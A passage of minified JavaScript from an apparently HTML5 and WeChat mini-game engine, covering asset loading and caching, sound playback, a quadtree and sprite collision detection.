    i && (["wav", "ogg", "mp3", "mpeg", "m4a"].includes(i.extension) || /^audio/.test(i.name)) ? (i._setFlag(PIXI__namespace.loaders.Resource.STATUS_FLAGS.LOADING, !0),
        isMiniGame ? (i.data = wx.createInnerAudioContext(), i.data.src = i.url, n()) : ((t = JSON.parse(JSON.stringify(i.metadata))).src = [i.url],
            t.onload = function () {
                n();
            }, t.onloaderror = function (t, e) {
                console.error(t, e, i), n();
            }, /^audio/.test(i.name) && (t.format = "mp3"), t.onend = function () { }, t.onplayerror = function (t) {
                console.error(t);
            }, i.data = new Howl(t))) : n();
}

isMiniGame && (fs = wx.getFileSystemManager());

var Loader = function () {
    function r(t) {
        classCallCheck(this, r), isMiniGame && (ASSETPATH = wx.env.USER_DATA_PATH + "/" + GameGlobal.game_id + "/"),
            this.loader = new PIXI__namespace.Loader(), this.loader.use(HowlerMiddleware), this.loader.resources = {},
            this.bindHooks(t), this.resources = {}, this.textures = {}, this.imgOutlineData = {},
            this.progress = 0, this.resourcesLoadComplete = !1, this.pack_list_cache = {}, this.ssList = {};
    }
    return createClass(r, null, [{
        key: "getInstance",
        value: function (t) {
            return r.instance = r.instance || new r(t);
        }
    }]), createClass(r, [{
        key: "bindHooks",
        value: function (t) {
            var n = this, e = t.onProgress, s = t.onComplete, i = t.onError;
            this.loader.onProgress.add(function (t) {
                n.progress = parseInt(t.progress), e && e(t.progress);
            }), this.loader.onError.add(function () {
                i && i();
            }), this.loader.onComplete.add(function (t, e) {
                if (n.progress = 100, n.resources) {
                    for (var i in Object.assign(n.resources, e), n.pack_list && n.parseSpriteSheet(),
                        e) e[i] || console.error("资源", i), e[i] && 3 === e[i].type && !n.isPackImage(i) && (PIXI__namespace.utils.TextureCache[i] ? n.textures[i] = PIXI__namespace.utils.TextureCache[i] : n.textures[i] = new PIXI__namespace.Texture(new PIXI__namespace.BaseTexture(e[i].data)),
                            n.getImageOutline(i, n.textures[i]));
                    window.__imageOutLineData = n.imgOutlineData, n.resourcesLoadComplete = !0, s && s();
                }
            });
        }
    }, {
        key: "getTexture",
        value: function (t) {
            return this.textures[t] || PIXI__namespace.utils.TextureCache[t];
        }
    }, {
        key: "removeTexture",
        value: function (t) {
            delete this.textures[t], delete PIXI__namespace.utils.TextureCache[t];
        }
    }, {
        key: "load",
        value: function (t, e, i, n, s) {
            var r, a = this, o = 5 < arguments.length && void 0 !== arguments[5] ? arguments[5] : function () { };
            this.progress = 0, this.pack_list = i, this._startLoadTime = Date.now(), this._collisionList = {},
                t.forEach(function (t) {
                    t.isCollision && (a._collisionList[t.id] = 1);
                }), n.forEach(function (t) {
                    a._collisionList[t] = 1;
                }), isMiniGame ? i && i.composite && i.composite.length ? (n = i.composite, i = void 0 === (i = i.extra) ? [] : i,
                    n = [].concat(toConsumableArray(void 0 === n ? [] : n), toConsumableArray(i), toConsumableArray(s)).map(function (t) {
                        return {
                            url: Config.cdn_url + t.blob_id,
                            id: t.blob_id,
                            type: "image"
                        };
                    }), this.loadFileByFile([].concat(toConsumableArray(n), toConsumableArray(e)), o)) : (i = [].concat(toConsumableArray(s)).map(function (t) {
                        return {
                            url: Config.cdn_url + t.blob_id,
                            id: t.blob_id,
                            type: "image"
                        };
                    }), this.loadFileByFile([].concat(toConsumableArray(t), toConsumableArray(e), toConsumableArray(i)), o)) : (r = [],
                        [].concat(toConsumableArray(t), toConsumableArray(e)).forEach(function (t) {
                            -1 !== r.indexOf(t.id) || PIXI__namespace.utils.TextureCache[t.id] || (a.addFileToLoaderList(t, 1),
                                r.push(t.id));
                        }), this.loader.load(o));
        }
    }, {
        key: "loadZip",
        value: function (e) {
            var i = this;
            wx.downloadFile({
                url: e,
                success: function (t) {
                    404 === t.statusCode ? console.error("Download file failed: " + e) : 200 === t.statusCode && t.tempFilePath && i.unzip(t.tempFilePath);
                },
                fail: function (t) {
                    console.error("Download file failed: " + JSON.stringify(t)), i.onError && i.onError(t);
                }
            }).onProgressUpdate(function (t) {
                i.onComplete && i.onComplete(t.progress);
            });
        }
    }, {
        key: "unzip",
        value: function (t) {
            var e = this;
            fs.unzip({
                zipFilePath: t,
                targetPath: ASSETPATH,
                success: function (t) {
                    console.log(t);
                },
                fail: function (t) {
                    e.onError && e.onError(t);
                }
            });
        }
    }, {
        key: "loadAssetByWxDownLoader",
        value: function (s) {
            var r = this, a = 0;
            !function n() {
                if (r.loader) for (var t; s.length && a <= 10 && "break" !== function () {
                    if (!r.loader) return "break";
                    t = s.shift(), a++;
                    var e = t.url, i = t.id;
                    wx.downloadFile({
                        url: e,
                        success: function (t) {
                            a--, 404 === t.statusCode ? console.error("Download file failed: " + e) : 200 === t.statusCode && t.tempFilePath && (fs.saveFile({
                                tempFilePath: t.tempFilePath,
                                filePath: ASSETPATH + i,
                                success: function (t) { },
                                fail: function (t) {
                                    -1 < t.errMsg.indexOf("maximum") && (console.error("存储资源出错", t.errMsg), rmdir());
                                }
                            }), r.loader) && n();
                        },
                        fail: function (t) {
                            a--, console.error("Download file failed: " + JSON.stringify(t));
                        }
                    });
                }(););
            }();
        }
    }, {
        key: "addFileToLoaderList",
        value: function (t, e) {
            var i, n;
            !this.resources || !t.id || this.resources[t.id] || this.resources["audio_" + t.id] || this.loader.resources[t.id] || this.loader.resources["audio_" + t.id] || PIXI__namespace.utils.TextureCache[t.id] || (i = {
                loadType: PIXI__namespace.LoaderResource.LOAD_TYPE.IMAGE,
                xhrType: PIXI__namespace.LoaderResource.XHR_RESPONSE_TYPE.BLOB
            }, n = e ? t.url : ASSETPATH + t.id, "image" === t.type ? this.loader.add(t.id, n, i) : "json" === t.type ? this.loader.add(t.id, n) : e ? "sound" === t.type ? this.loader.add("audio_" + t.id, n) : this.loader.add(t.id, n) : (this.resources[t.id] = wx.createInnerAudioContext(),
                this.resources[t.id].src = ASSETPATH + t.id));
        }
    }, {
        key: "loadFileByFile",
        value: function (t, i) {
            var n = [], s = this, r = t.length, a = 0;
            function o(t, e) {
                a++, s.addFileToLoaderList(t, e), a === r && s.loader && (s.loadAssetByWxDownLoader(n),
                    s.loader.load(i));
            }
            0 === r ? this.loader.load(i) : t.forEach(function (t) {
                var e = t;
                fs.access({
                    path: ASSETPATH + e.id,
                    success: function (t) {
                        o(e);
                    },
                    fail: function (t) {
                        n.push(e), o(e, 1);
                    }
                });
            });
        }
    }, {
        key: "translateCoord",
        value: function (t) {
            var e = [];
            return t.forEach(function (t) {
                e.push([t.x, t.y]);
            }), e;
        }
    }, {
        key: "getImageOutline",
        value: function (t, e) {
            var i, n, s, r, a, o;
            if (!isMiniGame && this._collisionList[t]) return window.__imageOutLineData && window.__imageOutLineData[t] ? (this.imgOutlineData[t] = window.__imageOutLineData[t],
                window.__imageOutLineData[t]) : (n = (i = isMiniGame ? wx.createCanvas() : document.createElement("canvas")).width = e.width,
                    s = i.height = e.height, (r = i.getContext("2d")).clearRect(0, 0, n, s), e.rotate && (r.translate(0, i.height),
                        r.rotate(-Math.PI / 180 * 90)), o = e.frame.width, a = e.frame.height, r.drawImage(e.baseTexture.source, e.frame.x || 0, e.frame.y || 0, o, a, 0, 0, o, a),
                    4 < (o = getOutline(e = r.getImageData(0, 0, n, s).data, n, s)).length && (o = GeometryHelper.convexHullOfPoints(o, e)),
                    o = this.translateCoord(o), r = i = null, this.imgOutlineData[t] = o);
        }
    }, {
        key: "destroy",
        value: function () {
            for (var t in this.resourcesLoadComplete = !1, this.ssList) this.ssList[t].destroy(!0),
                PIXI__namespace.utils.TextureCache[t].destroy(!0);
            for (var e in this.ssList = null, this.resources) delete this.resources[e];
            for (var i in this.resources = null, this.loader.resources) {
                var n = this.loader.resources[i];
                n.isComplete && n.isLoading && delete this.loader.resources[i];
            }
            for (var s in this.loader.destroy(), this.loader = null, r.instance = null, this.textures) this.textures[s].destroy(!0);
            this.textures = null, this.imgOutlineData = null, this.pack_list_cache = null;
        }
    }, {
        key: "getResouceById",
        value: function (t) {
            return this.resources[t];
        }
    }, {
        key: "parseSpriteSheet",
        value: function () {
            var n = this, s = this;
            this.pack_list.composite && this.pack_list.composite.forEach(function (i) {
                if (n.resources[i.blob_id] && !n.pack_list_cache[i.blob_id]) {
                    var t = JSON.parse(i.meta_json), e = {
                        frames: {},
                        meta: t.meta
                    };
                    if (t.frames.forEach(function (t) {
                        e.frames[t.name] = {
                            frame: t.frame,
                            rotated: t.rotated,
                            trimmed: t.trimmed,
                            spriteSourceSize: t.spriteSourceSize,
                            sourceSize: t.sourceSize
                        };
                    }), n.resources[i.blob_id]) {
                        s.ssList[i.blob_id] || (s.ssList[i.blob_id] = new PIXI__namespace.Spritesheet(new PIXI__namespace.BaseTexture(n.resources[i.blob_id].data), e));
                        try {
                            s.ssList[i.blob_id].parse(function (t) {
                                for (var e in t) s.textures[e] = t[e], s.textures[e.replace(/^1_/, "")] = t[e];
                                s.pack_list_cache[i.blob_id] = 1;
                            });
                        } catch (t) {
                            console.log("解析雪碧图失败", t);
                        }
                    }
                }
            });
        }
    }, {
        key: "isPackImage",
        value: function (e) {
            return !(!this.pack_list || !this.pack_list.composite) && -1 < this.pack_list.composite.findIndex(function (t) {
                return t.blob_id === e;
            });
        }
    }, {
        key: "resourceMap",
        get: function () {
            return this.resources;
        }
    }, {
        key: "outlines",
        get: function () {
            return this.imgOutlineData;
        }
    }]), r;
}();

function rmdir() {
    fs.rmdir({
        dirPath: ASSETPATH,
        recursive: !0,
        success: function () { },
        fail: function () { }
    });
}

var SoundManager = function () {
    function e(t) {
        t = t.cdn, classCallCheck(this, e), this.soundLib = Loader.getInstance().resourceMap,
            this.cdn_prefix = t, this.sounds = Object.create(null), this._playedSound = Object.create(null),
            this.musics = Object.create(null), this.isPlayBgm = null;
    }
    return createClass(e, [{
        key: "playSound",
        value: function (t) {
            var e = this, i = 1 < arguments.length && void 0 !== arguments[1] && arguments[1], n = void 0;
            this._playedSound[t] && this._playedSound[t].length ? (n = this._playedSound[t].pop()).play() : (this._playedSound[t] = [],
                isMiniGame ? ("ios" !== wxSystemInfo.platform && this.soundLib["audio_" + t] ? (n = this.soundLib["audio_" + t].data,
                    this.soundLib["audio_" + t] = null) : (n = wx.createInnerAudioContext()).src = wx.env.USER_DATA_PATH + "/" + GameGlobal.game_id + "/" + t,
                    n.loop = i, n.onEnded(function () {
                        e._playedSound[t].push(n);
                    })) : (n = new window.Howl({
                        src: this.cdn_prefix + t,
                        html5: !1,
                        loop: i,
                        format: ["mp3", "wav"]
                    })).on("end", function () {
                        e._playedSound[t].push(n);
                    }), n.play(), this.sounds[t] || (this.sounds[t] = []), this.sounds[t].push(n));
        }
    }, {
        key: "resumeBgmByShow",
        value: function () {
            this.isPlayBgm && this.isPlayBgm.play();
        }
    }, {
        key: "playBgm",
        value: function (t) {
            var e, i = 1 < arguments.length && void 0 !== arguments[1] && arguments[1];
            this.isPlayBgm && this.isPlayBgm.stop(), isMiniGame && "ios" !== wxSystemInfo.platform && this.musics[t] || ((e = this.soundLib["audio_" + t] || this.musics[t]) ? (this.musics[t] = e.data || e,
                this.musics[t].pause(), isMiniGame ? (this.musics[t]._played && (this.musics[t] = wx.createInnerAudioContext(),
                    this.musics[t].src = wx.env.USER_DATA_PATH + "/" + GameGlobal.game_id + "/" + t,
                    this.musics[t].autoplay = !0), this.musics[t]._played = !0, this.musics[t].loop = i) : this.musics[t].loop(i)) : isMiniGame ? (this.musics[t] && this.musics[t].destroy(),
                        this.musics[t] = wx.createInnerAudioContext(), this.musics[t].src = wx.env.USER_DATA_PATH + "/" + GameGlobal.game_id + "/" + t,
                        this.musics[t].autoplay = !0, this.musics[t].loop = i, this.musics[t].onError(function (t) {
                            console.error(t);
                        })) : this.musics[t] = new Howl({
                            src: this.cdn_prefix + t,
                            html5: !1,
                            loop: i,
                            format: ["mp3", "wav"]
                        })), this.musics[t].play(), this.isPlayBgm = this.musics[t];
        }
    }, {
        key: "stopSound",
        value: function (t) {
            this.musics[t] ? (this.musics[t].stop(), this.isPlayBgm = null) : this.sounds[t] ? this.sounds[t].forEach(function (t) {
                t.stop();
            }) : this.soundLib[t] && this.soundLib[t].data && this.soundLib[t].data.stop();
        }
    }, {
        key: "stopAll",
        value: function () {
            for (var t in this.soundLib) this.soundLib[t] && (6 === this.soundLib[t].type || /^audio/.test(this.soundLib[t].name)) && this.soundLib[t].data.stop();
            for (var e in this.sounds) this.sounds[e] && (this.sounds[e].length ? this.sounds[e].forEach(function (t) {
                t.stop();
            }) : this.sounds[e].stop());
            for (var i in this.musics) this.musics[i].stop();
            this.isPlayBgm = null;
        }
    }, {
        key: "stopBgm",
        value: function (t) {
            this.soundLib[t] && 6 === this.soundLib[t].type ? this.soundLib[t].data.stop() : this.musics[t] && (this.musics[t].stop(),
                this.isPlayBgm = null);
        }
    }, {
        key: "pauseAll",
        value: function () {
            for (var t in this.musics) this.musics[t].pause();
            this.isPlayBgm = null;
        }
    }, {
        key: "pauseSound",
        value: function (t) {
            this.sounds[t] && (this.sounds[t].length ? this.sounds[t].forEach(function (t) {
                t.pause();
            }) : this.sounds[t].pause()), this.musics[t] && (this.musics[t].pause(), this.isPlayBgm = null),
                this.soundLib[t] && this.soundLib[t].data && this.soundLib[t].data.pause();
        }
    }, {
        key: "resumeSound",
        value: function (t) {
            this.sounds[t] && this.sounds[key] && this.sounds[key].length && this.sounds[key].forEach(function (t) {
                t.resume();
            });
        }
    }, {
        key: "resumeBgm",
        value: function (t) {
            this.musics[t] && this.musics[t].resume();
        }
    }, {
        key: "destroyAll",
        value: function () {
            for (var t in this.stopAll(), this.soundLib) this.soundLib[t] && (6 === this.soundLib[t].type || /^audio/.test(this.soundLib[t].name)) && (this.soundLib[t].data.stop(),
                isMiniGame) && this.soundLib[t].data.destroy();
            for (var e in this.sounds) this.sounds[e] && (this.sounds[e].length ? this.sounds[e].forEach(function (t) {
                t.stop(), isMiniGame && t.destroy();
            }) : isMiniGame ? this.sounds[e].destroy() : this.sounds[e] = null);
            for (var i in this.musics) this.musics[i].pause(), isMiniGame ? this.musics[i].destroy() : (this.musics[i].stop(),
                delete this.musics[i]);
            this.soundLib = null, this.cdn_prefix = null, this.sounds = null, this._playedSound = null,
                this.musics = null, this.isPlayBgm = null;
        }
    }]), e;
}(), QuadTree = function () {
    function r(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 10, i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : 4, n = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : 0;
        classCallCheck(this, r), this.max_objects = e, this.max_levels = i, this.bounds = t,
            this.level = n, this.objects = [], this.nodes = [];
    }
    return createClass(r, [{
        key: "split",
        value: function () {
            var t = this.level + 1, e = Math.round(this.bounds.width / 2), i = Math.round(this.bounds.height / 2), n = Math.round(this.bounds.x), s = Math.round(this.bounds.y);
            this.nodes[0] = new r({
                x: n + e,
                y: s,
                width: e,
                height: i
            }, this.max_objects, this.max_levels, t), this.nodes[1] = new r({
                x: n,
                y: s,
                width: e,
                height: i
            }, this.max_objects, this.max_levels, t), this.nodes[2] = new r({
                x: n,
                y: s + i,
                width: e,
                height: i
            }, this.max_objects, this.max_levels, t), this.nodes[3] = new r({
                x: n + e,
                y: s + i,
                width: e,
                height: i
            }, this.max_objects, this.max_levels, t);
        }
    }, {
        key: "getIndex",
        value: function (t) {
            var e = -1, i = this.bounds.x + this.bounds.width / 2, n = this.bounds.y + this.bounds.height / 2, s = t.y < n && t.y + t.height < n, n = t.y > n;
            return t.x < i && t.x + t.width < i ? s ? e = 1 : n && (e = 2) : t.x > i && (s ? e = 0 : n && (e = 3)),
                e;
        }
    }, {
        key: "insert",
        value: function (t) {
            if (this.nodes.length) {
                var e = this.getIndex(t);
                if (-1 !== e) return void this.nodes[e].insert(t);
            }
            if (this.objects.push(t), !this.nodes.length && this.objects.length > this.max_objects && this.level < this.max_levels) {
                this.split();
                for (var i = this.objects.length - 1; 0 <= i; i--) {
                    var n = this.getIndex(this.objects[i]);
                    -1 !== n && this.nodes[n].insert(this.objects.splice(i, 1)[0]);
                }
            }
        }
    }, {
        key: "retrieve",
        value: function (t) {
            var e = [];
            if (this.nodes.length) {
                var i = this.getIndex(t);
                if (-1 !== i) e = e.concat(this.nodes[i].retrieve(t)); else for (var n = carveRect(this.bounds), s = n.length - 1; 0 <= s; s--) this.checkIntersect(n[s], t) && (e = e.concat(this.nodes[s].retrieve(t)));
            }
            return e.concat(this.objects);
        }
    }, {
        key: "checkIntersect",
        value: function (t, e) {
            return t.x < e.x + e.width && t.x + t.width > e.x && t.y < e.y + e.height && t.y + t.height > e.y;
        }
    }, {
        key: "clear",
        value: function () {
            this.objects = [], this.nodes = [], this.level = 0;
        }
    }, {
        key: "refresh",
        value: function (t) {
            var e, i, n, s, r = this.objects;
            for (t = t || this, n = r.length - 1; 0 <= n; n--) e = r[n], i = this.getIndex(e),
                this.isInner(e, this.bounds) ? this.nodes.length && this.nodes[i].insert(r.splice(n, 1)[0]) : this !== t && t.insert(r.splice(n, 1)[0]);
            for (n = 0, s = this.nodes.length; n < s; n++) this.nodes[n].refresh(t);
        }
    }, {
        key: "isInner",
        value: function (t, e) {
            return t.x >= e.x && t.x + t.width <= e.x + e.width && t.y >= e.y && t.y + t.height <= e.y + e.height;
        }
    }]), r;
}();

function carveRect(t) {
    var e = t.width / 2, i = t.height / 2;
    return [{
        x: t.x + e,
        y: t.y,
        width: e,
        height: i
    }, {
        x: t.x,
        y: t.y,
        width: e,
        height: i
    }, {
        x: t.x,
        y: t.y + i,
        width: e,
        height: i
    }, {
        x: t.x + e,
        y: t.y + i,
        width: e,
        height: i
    }];
}

var MINI_POINTS_OF_COLLISION = 1, CollisionManager = function () {
    function e(t) {
        classCallCheck(this, e), this.loader = Loader.getInstance(), this.app = t, this.runtime = t.vm,
            this.runtimeData = t.runtimeData, this.collisionRecord = {}, this.collisionPairs = {},
            this.pairsData = [], this.quadTree = new QuadTree(new PIXI__namespace.Rectangle(0, 0, t.realWidth, t.realHeight)),
            this.pluginManager = this.app.vm.getPluginManager(), this._physicsSystem = this.pluginManager._behaviorsByCtor.get(LB.Behaviors.Physical),
            this._physicsSystem && (this._physicsSystem = this._physicsSystem.physicsSystem);
    }
    return createClass(e, [{
        key: "clear",
        value: function () {
            var t = !0, e = !1, i = void 0;
            try {
                for (var n, s = this.pairsData[Symbol.iterator](); !(t = (n = s.next()).done); t = !0) n.value,
                    this.pairsData.pop();
            } catch (t) {
                e = !0, i = t;
            } finally {
                try {
                    !t && s.return && s.return();
                } finally {
                    if (e) throw i;
                }
            }
        }
    }, {
        key: "loadColliders",
        value: function (t) {
            this.pairsData = unique(this.pairsData.concat(t));
        }
    }, {
        key: "getSpriteById",
        value: function (t) {
            try {
                return this.runtimeData.getSpriteById(t);
            } catch (t) {
                return null;
            }
        }
    }, {
        key: "update",
        value: function () {
            var i = this;
            if (this.pairsData && this.pairsData.length && this.runtimeData.currentScene) {
                this.collisionRecord = {}, this.collisionPairs = {}, this.clearUpPairs().forEach(function (t, e) {
                    Performance.startPointToList("collision_SAT"), i.detectCollisionsByQuadTree(t),
                        Performance.endPointToList("collision_SAT");
                });
                for (var t = this.runtimeData.currentScene.sprites, e = 0; e < t.length; e++) {
                    var n = t[e];
                    n && !this.collisionPairs[n.id] && (n.lastCollsionList = []);
                }
                this.runtimeData.currentScene.tpls.forEach(function (t) {
                    i.runtimeData.scenes[t].sprites.forEach(function (t) {
                        t && !i.collisionPairs[t.id] && (t.lastCollsionList = []);
                    });
                }), this.emitCollisionEvent(), this.quadTree.clear();
            }
        }
    }, {
        key: "clearUpPairs",
        value: function () {
            var r = this, a = [];
            return this.pairsData.forEach(function (t, e) {
                var i = (t = slicedToArray(t, 2))[0], t = t[1], n = r.runtimeData.getCloneListById(i), s = r.runtimeData.getCloneListById(t);
                a.push({
                    a_list: n,
                    b_list: s,
                    selfCollision: 0 <= s.indexOf(i) || 0 <= n.indexOf(t)
                });
            }), a;
        }
    }, {
        key: "detectCollisionsByQuadTree",
        value: function (t) {
            var n = this, e = t.a_list, i = t.b_list, s = t.selfCollision, r = (this.quadTree.clear(),
                this), a = (Performance.startPointToList("collisionPolygon"), []);
            e.forEach(function (t) {
                var i = r.getSpriteById(t);
                i && n.checkAndGetAllChildren([i]).forEach(function (t) {
                    t.id !== i.id && (t.collision_original_target = i.id);
                    var e = t.renderer;
                    e && e.visible && !e.noCollision && !e.checkOutOfBoundary() && a.push(t);
                });
            }), i.forEach(function (t) {
                var i = r.getSpriteById(t);
                i && n.checkAndGetAllChildren([i]).forEach(function (t) {
                    t.id !== i.id && (t.collision_original_target = i.id);
                    var e = t.renderer;
                    e && e.visible && !e.noCollision && !e.checkOutOfBoundary() && ((e = e.getBounds()).id = t.id,
                        n.quadTree.insert(e));
                });
            }), Performance.endPointToList("collisionPolygon"), Performance.startPointToList("collisionAABB_function");
            for (var o = 0; o < a.length; o++) for (var l = a[o], h = this.quadTree.retrieve(l.renderer.getBounds()), u = 0; u < h.length; u++) {
                var c = this.getSpriteById(h[u].id);
                l.id === c.id || !s && l.mother && c.mother && l.mother === c.mother || this.collisionPairs[l.id] && -1 < this.collisionPairs[l.id].indexOf(c.id) || this.checkCollision(l.renderer, c.renderer) && (this.addToCollisionPairs(l.id, c.id),
                    l.collision_original_target || c.collision_original_target) && this.addToCollisionPairs(l.collision_original_target || l.id, c.collision_original_target || c.id);
            }
            Performance.endPointToList("collisionAABB_function");
        }
    }, {
        key: "registerCollision",
        value: function (t, e) {
            for (var i = this.runtimeData.getSpriteById(t).origin, n = this.runtimeData.getSpriteById(e).origin, s = 0; s < this.pairsData.length; s++) {
                var r = this.pairsData[s];
                if (-1 < r.indexOf(t) && -1 < r.indexOf(e) || -1 < r.indexOf(i) && -1 < r.indexOf(n) || -1 < r.indexOf(t) && -1 < r.indexOf(n) || -1 < r.indexOf(i) && -1 < r.indexOf(e)) {
                    this.addToCollisionPairs(t, e), this.emitCollisionEvent();
                    break;
                }
            }
        }
    }, {
        key: "checkCollision",
        value: function (t, e) {
            var i = t.id, n = e.id, s = i + "--" + n, r = n + "--" + i;
            return void 0 !== this.collisionRecord[s] || void 0 !== this.collisionRecord[r] ? this.collisionRecord[s] : this._physicsSystem && this._physicsSystem.running_actors[i] && this._physicsSystem.running_actors[n] ? (i = t._behaviorInst.Physical.physicsSystem.checkBump(i, n),
                this.collisionRecord[s] = i, this.collisionRecord[r] = i) : (n = this.doCollider(t, e),
                    this.collisionRecord[s] = n, this.collisionRecord[r] = n);
        }
    }, {
        key: "doCollider",
        value: function (t, e, i) {
            var n = t._config.outline && t._config.outline.type, s = e._config.outline && e._config.outline.type;
            return n || s ? "polygon" === n ? "polygon" === s ? Intersection.polygonPolygon(t.getPolygonByOutline(i), e.getPolygonByOutline(i)) : "rect" === s ? Intersection.polygonPolygon(t.getPolygonByOutline(i), e.getRectPoints(i)) : "circle" === s ? Intersection.polygonCircle(t.getPolygonByOutline(i), e.getCircle(i)) : Intersection.polygonPolygon(t.getPolygonByOutline(i), e.getPolygon(i)) : "circle" === n ? "polygon" === s ? Intersection.polygonCircle(e.getPolygonByOutline(i), t.getCircle(i)) : "rect" === s ? Intersection.polygonCircle(e.getRectPoints(i), t.getCircle(i)) : "circle" === s ? Intersection.circleCircle(t.getCircle(i), e.getCircle(i)) : Intersection.polygonCircle(e.getPolygon(i), t.getCircle(i)) : "rect" === n ? "polygon" === s ? Intersection.polygonPolygon(t.getRectPoints(i), e.getPolygonByOutline(i)) : "rect" === s ? Intersection.polygonPolygon(t.getRectPoints(i), e.getRectPoints(i)) : "circle" === s ? Intersection.polygonCircle(t.getRectPoints(i), e.getCircle(i)) : Intersection.polygonPolygon(t.getRectPoints(i), e.getPolygon(i)) : "polygon" === s ? Intersection.polygonPolygon(t.getPolygon(i), e.getPolygonByOutline(i)) : "rect" === s ? Intersection.polygonPolygon(t.getPolygon(i), e.getRectPoints(i)) : "circle" === s ? Intersection.polygonCircle(t.getPolygon(i), e.getCircle(i)) : Intersection.polygonPolygon(t.getPolygon(i), e.getPolygon(i)) : Intersection.polygonPolygon(t.getPolygon(i), e.getPolygon(i));
        }
    }, {
        key: "addToCollisionPairs",
        value: function (t, e) {
            this.collisionPairs[t] ? this.collisionPairs[t].push(e) : this.collisionPairs[t] = [e],
                this.collisionPairs[e] ? this.collisionPairs[e].push(t) : this.collisionPairs[e] = [t];
        }
    }, {
        key: "getSolidCollisionCandidates",
        value: function (t) {
            var e = [];
            if (LB.Behaviors.Solid) {
                if (!(i = this.pluginManager.getBehaviorByConstructorFunction(LB.Behaviors.Solid))) return !1;
                var i = i.getInstances(), n = !0, s = !1, r = void 0;
                try {
                    for (var a, o = i[Symbol.iterator](); !(n = (a = o.next()).done); n = !0) {
                        var l = a.value;
                        l._instance && t !== l._instance.id && this.app.runtimeData.current_scene_id === l._instance.sceneRenderer.id && e.push(l);
                    }
                } catch (t) {
                    s = !0, r = t;
                } finally {
                    try {
                        !n && o.return && o.return();
                    } finally {
                        if (s) throw r;
                    }
                }
            }
            return e;
        }
    }, {
        key: "testOverlapSolid",
        value: function (t) {
            if (!t) return !1;
            if (!t.renderer.visible) return !1;
            for (var e = [], i = this.getSolidCollisionCandidates(t.id), n = 0; n < i.length; n++) {
                var s = i[n], r = s._instance.renderer;
                s.isEnabled() && r.visible && this.doCollider(t.renderer, r, !0) && e.push(s._instance);
            }
            return !!e.length && e;
        }
    }, {
        key: "pushOutSolid",
        value: function (t, e, i, n, s, r, a) {
            s = s || 50;
            for (var o = e.renderer, l = t.x, h = t.y, u = 0; u < s; ++u) if (o.setPosition(l + i * u, h + n * u),
                this.testOverlap(e, a)) return o.setPosition(l + i * (u - 1), h + n * (u - 1)),
                    !0;
            return o.setPosition(l, h), !1;
        }
    }, {
        key: "_pushOutSolid",
        value: function (t, e, i, n, s, r, a) {
            s = s || 50;
            for (var o = e.renderer, l = t.x, h = t.y, u = null, c = null, p = 0; p < s; ++p) if (o.setPosition(l + n * p, h + n * p),
                !this.testOverlap(e, u)) if (u = (u = this.testOverlapSolid(e)) && u[0]) c = u; else if (r && (u = a ? this.testOverlap(e, a) ? a : null : this.testOverlapJumpthru(e)) && (c = u),
                    !u) return c && this.pushInFractional(t, e, i, n, c, 16, !0), !0;
            return o.setPosition(l, h), !1;
        }
    }, {
        key: "pushInFractional",
        value: function (t, e, i, n, s, r, a) {
            for (var o = 2, l = !1, h = !1, u = e.renderer, c = t.x, p = t.y; o <= r;) {
                var d = 1 / o;
                o *= 2, u.offsetXY(i * d * (l ? 1 : -1), n * d * (l ? 1 : -1)), this.testOverlap(e, s) || a && this.testOverlapSolid(e) ? h = l = !0 : (h = l = !1,
                    c = u.getX(), p = u.getY());
            }
            h && u.setPosition(c, p);
        }
    }, {
        key: "getJumpthruCollisionCandidates",
        value: function (t) {
            var e = [];
            if (LB.Behaviors.Jumpthrough) {
                if (!(i = this.pluginManager.getBehaviorByConstructorFunction(LB.Behaviors.Jumpthrough))) return !1;
                var i = i.getInstances(), n = !0, s = !1, r = void 0;
                try {
                    for (var a, o = i[Symbol.iterator](); !(n = (a = o.next()).done); n = !0) {
                        var l = a.value;
                        l._instance && t !== l._instance.id && this.app.runtimeData.current_scene_id === l._instance.sceneRenderer.id && e.push(l);
                    }
                } catch (t) {
                    s = !0, r = t;
                } finally {
                    try {
                        !n && o.return && o.return();
                    } finally {
                        if (s) throw r;
                    }
                }
            }
            return e;
        }
    }, {
        key: "testOverlap",
        value: function (t, e) {
            return !!(t && e && t !== e && (t = t.renderer, e = e.renderer, t.visible) && e.visible) && this.doCollider(t, e, !0);
        }
    }, {
        key: "testOverlapJumpthrough",
        value: function (t, e) {
            if (t) {
                if (!t.renderer.visible) return !1;
                for (var i = null, n = (e && (i = []), this.getJumpthruCollisionCandidates(t.id)), s = 0; s < n.length; s++) {
                    var r = n[s], a = r._instance.renderer;
                    if (r.isEnabled() && a.visible && this.doCollider(t.renderer, a, !0)) {
                        if (!e) return r;
                        i.push(r);
                    }
                }
                return i;
            }
        }
    }, {
        key: "emitCollisionEvent",
        value: function () {
            var t, n = this;
            for (t in this.collisionPairs) !function (e) {
                var i = n.getSpriteById(e);
                n.collisionPairs[e].filter(function (t, e, i) {
                    return i.indexOf(t) === e;
                }), i && (n.collisionPairs[e].forEach(function (t) {
                    -1 === (i.lastCollsionList || []).indexOf(t) && n.app.eventEmitter.emit(OPCODE.eventObjectTouchingObject, null, null, e, t);
                }), i.lastCollsionList = JSON.parse(JSON.stringify(n.collisionPairs[e])));
            }(t);
        }
    }, {
        key: "isTinySpirte",
        value: function (t) {
            return t.width * t.height < 5 * MINI_POINTS_OF_COLLISION;
        }
    }, {
        key: "collision",
        value: function (t, e) {
            var i = this, n = this.getSpriteById(t).renderer;
            if (n) {
                if (!n.visible || n.noCollision) return !(n.isCollisioningList = []);
                if (!this.collisionPairs[t] || 0 === this.collisionPairs[t].length) return !(n.isCollisioningList = []);
                for (var s = this.runtimeData.getCloneListById(e).filter(function (t) {
                    return (t = i.getSpriteById(t)) && t.renderer && t.renderer.visible;
                }), r = this.collisionPairs[t], a = {
                    result: !1,
                    spriteID1: t
                }, o = 0; o < r.length; o++) if (-1 < s.indexOf(r[o])) {
                    a = {
                        result: !0,
                        spriteID1: t,
                        spriteID2: r[o]
                    };
                    break;
                }
                return n.isCollisioningList = n.isCollisioningList || [], !(-1 < n.isCollisioningList.indexOf(a.spriteID2)) && (a.result && (n.isCollisioningList = [a.spriteID2]),
                    a);
            }
        }
    }, {
        key: "intersect",
        value: function (t, e) {
            var i = this;
            if (!(n = this.getSpriteById(t).renderer) || !n.visible || n.noCollision) return !1;
            if (!this.collisionPairs[t] || 0 === this.collisionPairs[t].length) return !1;
